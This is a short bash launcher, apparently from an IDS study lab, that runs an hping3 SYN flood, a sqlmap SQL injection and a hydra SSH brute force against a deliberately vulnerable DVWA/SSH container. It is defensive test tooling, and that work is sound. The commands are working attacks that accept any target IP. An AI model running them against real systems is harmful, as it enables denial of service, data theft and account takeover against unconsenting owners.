#!/bin/bash
# =============================================================================
# attack.sh - Adversarial payload launcher (run from the Kali attacker / VM2)
# -----------------------------------------------------------------------------
# Thin wrapper around the three attack tools used in the study so the trial
# commands stay identical to the ground_truth.json metadata.
#
# LAB USE ONLY. These target the deliberately vulnerable DVWA/SSH container on
# the isolated ids_net bridge. Never point this at anything you do not own.
#
#   ./attack.sh dos          [target_ip]
#   ./attack.sh sqli         [target_ip]
#   ./attack.sh bruteforce   [target_ip] [wordlist]
# =============================================================================
set -euo pipefail

ATTACK="${1:-}"
TARGET="${2:-172.20.0.20}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

usage() { echo "usage: $0 {dos|sqli|bruteforce} [target_ip] [wordlist]"; exit 1; }

case "${ATTACK}" in
  dos)
    echo "[attack] TCP SYN flood -> ${TARGET}:80 (hping3)"
    # -S SYN, --flood send as fast as possible, -p 80 DVWA web port
    # (the container's internal port; only use 8080 when going through the
    # host-published mapping instead of the ids_net IP directly).
    sudo hping3 -S --flood -V -p 80 "${TARGET}"
    ;;

  sqli)
    echo "[attack] SQL injection -> DVWA sqli module (sqlmap)"
    sqlmap -u "http://${TARGET}:80/vulnerabilities/sqli/?id=1&Submit=Submit" \
           --batch --level=2 --risk=2 \
           --cookie="security=low; PHPSESSID=lab" \
           --threads=4
    ;;

  bruteforce)
    echo "[attack] SSH brute force -> ${TARGET}:22 (hydra)"
    hydra -l root -P "${WORDLIST}" -t 4 -f -V "ssh://${TARGET}:22"
    ;;

  *)
    usage
    ;;
esac
